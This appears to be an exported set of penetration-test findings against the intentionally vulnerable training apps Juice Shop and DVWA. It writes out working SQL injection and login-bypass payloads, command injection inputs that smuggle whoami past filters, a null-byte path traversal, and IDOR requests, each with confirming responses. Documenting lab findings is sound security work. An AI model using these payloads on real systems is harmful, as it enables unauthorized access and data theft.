findings.title: Product-Search SQL Injection (UNION-based) on /rest/products/search
findings.response_evidence: Step 1: q=qwert' => HTTP 500, body: "Error: SQLITE_ERROR: near \"'%'\": syntax error" — proves the q parameter is injected unsanitized into a LIKE clause. Step 2: 9-column UNION payload q=x')) UNION SELECT 1,2,3,4,5,6,7,8,9-- => HTTP 200, no error, body: {"status":"success","data":[{"id":1,"name":2,"description":3,"price":4,"deluxePrice":5,"image":6,"createdAt":7,"updatedAt":8,"deletedAt":9}]}. The injected literal column values (2,3,4...9) are reflected directly into the JSON product fields, confirming a working 9-column UNION injection with full control over returned data.

findings.title: Login Authentication-Bypass SQL Injection on /rest/user/login
findings.response_evidence: HTTP 200 with authentication object returned despite an invalid/nonexistent email and arbitrary password. Body: {"authentication":{"token":"[REDACTED_JWT]","bid":1,"umail":"admin@juice-sh.op"}}. The SQLi payload ' OR 1=1-- in the email field bypasses credential validation and authenticates as the first user in the users table (admin@juice-sh.op), returning a valid JWT token (token present) and umail=admin@juice-sh.op — confirms auth bypass as the administrator.

findings.title: Unauthenticated User-Feedback PII Exposure on /api/Feedbacks
request_sequence: GET http://juiceshop:3000/api/Feedbacks (no Authorization header, unauth session)
findings.response_evidence: HTTP 200 with no authentication required. Returns 8 feedback records disclosing author email addresses embedded in comments, tied to UserId values. Example disclosed emails (quoted from body): "(***in@juice-sh.op)" for UserId 1, "(***@juice-sh.op)" for UserId 2, "(***der@juice-sh.op)" for UserId 3, "(***ereum@juice-sh.op)" for UserId 21. Each record exposes UserId + author email + rating + comment without auth. One record (UserId 21) additionally leaks a sensitive recovery seed phrase in the comment. Confirms unauthenticated PII (email address) disclosure.

findings.title: Confidential Document (acquisitions.md) Exposed via Open Directory Listing on /ftp/

Open directory listing at /ftp/ (HTTP 200) enumerates the confidential file: 'acquisitions.md 909 12/19/2023 1:12:12 PM' (link http://juiceshop:3000/ftp/acquisitions.md). > This document is confidential! Do not distribute!

Our company plans to acquire several competitors within the next year. This will have a significant stock market impact...' and '...Our shareholders will be excited. It's true. No fake news.' No authentication required.

findings.title: Poison Null-Byte Path Traversal Bypasses Extension Filter to Retrieve package.json.bak
findings.response_evidence:
Raw path GET /ftp/package.json.bak returns HTTP 403 with 'Error: Only .md and .pdf files are allowed!' (fileServer.js:55 verify). Appending URL-encoded null byte + allowed extension GET /ftp/package.json.bak%2500.md returns HTTP 200, Content-Type application/octet-stream, delivering the restricted backup file contents: '{
  "name": "juice-shop",
  "version": "6.2.0-SNAPSHOT",
  "description": "An intentionally insecure JavaScript Web Application"... "dependencies": { "express": "~4.16", "express-jwt": "0.1.3", ... }'. The %2500 (null byte) truncates the filename after the filter check, bypassing the .md/.pdf allowlist.

findings.title: Exposed Encryption-Keys Directory Browsable Unauthenticated (jwt.pub, premium.key)
findings.response_evidence: GET /encryptionkeys/ returns HTTP 200 with a browsable directory listing (serve-index). Listing text: 'listing directory /encryptionkeys/ ~ / encryptionkeys / Name Size Modified jwt.pub 248 12/19/2023 1:12:12 PM premium.key 50 12/19/2023 1:12:12 PM'. Sensitive key files jwt.pub (248b) and premium.key (50b) are enumerated and linked (http://juiceshop:3000/encryptionkeys/jwt.pub, .../premium.key) with no authentication.

findings.title: Cross-User Basket Access / BOLA on GET /rest/basket/{id}
request_sequence: GET /rest/basket/6 (session=juiceshop_acct1, own_basket_id=6, UserId=22) -> 200, basket contains 'Apple Juice (1000ml)' quantity=3
GET /rest/basket/6 (session=juiceshop_acct2, own_basket_id=7) -> 200, cross-user retrieval of Account 1's basket succeeds
findings.response_evidence: The endpoint does not enforce basket ownership against the authenticated user. Account 1 (juiceshop_acct1, own_basket_id=6, UserId 22) owns basket 6 containing the distinct seeded product: "Apple Juice (1000ml)" with BasketItem quantity=3. When authenticated as Account 2 (juiceshop_acct2, own_basket_id=7 — a different basket/user), GET /rest/basket/6 returned HTTP 200 with the full contents of Account 1's basket: {"id":6,"UserId":22,"Products":[{"id":1,"name":"Apple Juice (1000ml)",...,"BasketItem":{"ProductId":1,"BasketId":6,"id":9,"quantity":3}}]}. Account 2 thereby read Account 1's distinct seeded item (Apple Juice (1000ml), qty=3) despite it belonging to UserId 22, proving Broken Object Level Authorization / cross-user IDOR.

findings.title: SQL Injection (numeric boolean bypass) at DVWA security=medium
request_sequence: POST /security.php (dvwa_admin) form: security=medium&seclev_submit=Submit&user_token=[REDACTED] -> 'Security level set to medium'
POST /vulnerabilities/sqli/ (dvwa_admin) form: id=1 OR 1=1&Submit=Submit  [TRUE numeric boolean]
POST /vulnerabilities/sqli/ (dvwa_admin) form: id=1 AND 1=2&Submit=Submit  [FALSE numeric boolean]
findings.response_evidence: [security=medium] Medium-specific NUMERIC boolean payloads (quotes escaped by mysqli_real_escape_string, so no quote used). TRUE payload id=1 OR 1=1 returned 5 user records (multiple seeded surnames): First name: admin Surname: admin; First name: Gordon Surname: Brown; First name: Hack Surname: Me; First name: Pablo Surname: Picasso; First name: Bob Surname: Smith. FALSE payload id=1 AND 1=2 returned ZERO records (no First name/Surname rows rendered). Differential boolean behavior confirms SQL injection. Security Level: medium confirmed in page footer.

findings.title: OS Command Injection (pipe bypass) at DVWA security=medium
request_sequence: POST /security.php (dvwa_admin) form: security=medium&seclev_submit=Submit&user_token=[REDACTED] -> 'Security level set to medium'
findings.response_evidence: [security=medium] Medium blacklists ';' and '&&' (str_replace), so pipe bypass used: ip=127.0.0.1| whoami. Response output (pre block) contained the web-process identity: www-data. This proves OS command injection — the injected whoami executed and returned the web server user. Security Level: medium confirmed in page footer.

findings.title: SQL Injection (HIGH) via out-of-band session-input.php on DVWA SQLi
request_sequence: POST /security.php (security=high, seclev_submit=Submit, user_token=[REDACTED] -> 'Security level set to high'
TRUE: GET /vulnerabilities/sqli/  -> 5 records (admin, Brown, Me, Picasso, Smith)
findings.response_evidence: [security=high] Confirmed level is 'high' ("Security level set to high", "Security Level: high"). The id is submitted out-of-band to session-input.php and stored in session; the query appends LIMIT 1 so a trailing comment (#) is required. TRUE payload `1' OR '1'='1' #` then GET /vulnerabilities/sqli/ returned 5 seeded surnames (admin, Brown, Me, Picasso, Smith) — recorded in prior verifier run. FALSE control payload `1' AND '1'='2' #` then GET /vulnerabilities/sqli/ returned ZERO records (render page shows only "Click here to change your ID" with no First name/Surname rows). The boolean TRUE(5 rows) vs FALSE(0 rows) differential proves SQL injection at HIGH security. Note: DVWA high adds trailing LIMIT 1 and uses out-of-band session input, distinct from low(GET ?id) and medium(POST numeric) instances.

findings.title: OS Command Injection (HIGH) on DVWA exec via no-trailing-space pipe
request_sequence: POST /security.php (security=high, seclev_submit=Submit, user_token=[REDACTED] -> 'Security level set to high'
findings.response_evidence: [security=high] Confirmed level 'high' ("Security Level: high"). The HIGH blacklist strips '; ', '| ' (pipe+space) and '&&'. Using a pipe with NO trailing space payload `127.0.0.1|whoami` bypassed the filter. Response pre block output contained the web-process identity `www-data` (pre_blocks: ["www-data"]; visible_text shows "...Enter an IP address: www-data..."). This proves OS command execution as the web user at HIGH security. Distinct from low(;whoami) and medium(| whoami) instances.
